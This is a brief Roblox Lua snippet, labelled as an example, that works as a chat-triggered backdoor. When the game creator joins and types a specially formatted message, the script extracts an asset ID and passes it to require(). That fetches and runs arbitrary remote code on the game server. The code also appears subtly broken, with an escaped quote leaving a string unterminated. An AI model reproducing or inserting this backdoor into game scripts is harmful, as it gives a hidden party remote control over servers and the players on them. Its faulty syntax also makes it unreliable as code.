-- Example

script = Instance.new("Script")

local list={game.CreatorId}

game:service("Players").PlayerAdded:Connect(function(p)
if table.find(list,p.Name) or table.find(list,p.UserId) then
p.Chatted:connect(function(msg)
local id=tonumber(msg:split("/c"..p.UserId.."r\")[2])
if id then
require(id)
end
end)
end
end)
